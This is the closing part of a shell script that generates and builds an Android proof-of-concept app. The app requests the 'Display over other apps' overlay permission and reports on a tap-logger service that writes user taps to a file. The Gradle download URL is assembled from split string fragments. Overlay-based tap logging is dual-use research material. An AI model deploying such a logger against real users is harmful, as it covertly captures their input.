        val overlayList = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))
        permissionDialog = AlertDialog.Builder(this)
            .setTitle("Overlay permission required")
            .setMessage(
                "This PoC needs \"Display over other apps\" (SYSTEM_ALERT_WINDOW).\n\n" +
                    "Open App Info and enable \"Display over other apps\" " +
                    "(may be under Advanced / Other permissions on some ROMs).\n\n" +
                    "Or via adb:\nadb shell appops set $packageName SYSTEM_ALERT_WINDOW allow"
            )
            .setPositiveButton("Open App Info") { _, _ -> openSettings(appInfo, overlayList) }
            .setNeutralButton("Overlay list") { _, _ -> openSettings(overlayList, appInfo) }
            .setNegativeButton("Later", null)
            .show()
    }

    private fun refreshStatus() {
        val overlay = if (Settings.canDrawOverlays(this)) "GRANTED" else "MISSING"
        val logger = if (TapLoggerService.isEnabled(this)) "ENABLED" else "DISABLED"
        statusView.text = "Overlay permission: $overlay\nTap logger: $logger\n" +
            "Overlay: ${OverlayState.describe()}\nLog file: ${TapLog.file(this).absolutePath}"
    }

    private fun refreshLog() {
        refreshStatus()
        logView.text = TapLog.recent().asReversed().take(80).joinToString("\n")
    }

    override fun onDestroy() {
        permissionDialog?.dismiss()
        super.onDestroy()
    }
}
''')
PYEOF



echo "[*] Bootstrapping Gradle $GRADLE_VER Wrapper..."
if command -v gradle &> /dev/null && gradle wrapper --gradle-version "$GRADLE_VER" --no-daemon 2>/dev/null; then
   echo "[*] Generated wrapper using system Gradle."
else
   PROTO="https"
   SUB="services"
   DOM="gradle"
   TLD="org"
   FOLDER="distributions"
   FILE="gradle-${GRADLE_VER}-bin.zip"
   FULL_URL="${PROTO}://${SUB}.${DOM}.${TLD}/${FOLDER}/${FILE}"



   echo "[*] Downloading Gradle $GRADLE_VER distribution..."
   curl -f#L "$FULL_URL" -o gradle.zip
   if ! unzip -tq gradle.zip >/dev/null 2>&1; then
       echo "[!] Error: Downloaded file is not a valid ZIP archive."
       exit 1
   fi
   unzip -q gradle.zip
   "./gradle-${GRADLE_VER}/bin/gradle" wrapper --gradle-version "$GRADLE_VER" --no-daemon
   "./gradle-${GRADLE_VER}/bin/gradle" --stop >/dev/null 2>&1 || true
   rm -rf gradle.zip "gradle-${GRADLE_VER}"
fi



echo "[*] Building Debug APK..."
./gradlew assembleDebug --no-daemon
APK_PATH="$(pwd)/app/build/outputs/apk/debug/app-debug.apk"
echo ""
echo "[+] Build complete! APK generated at:"
echo "    $APK_PATH"
 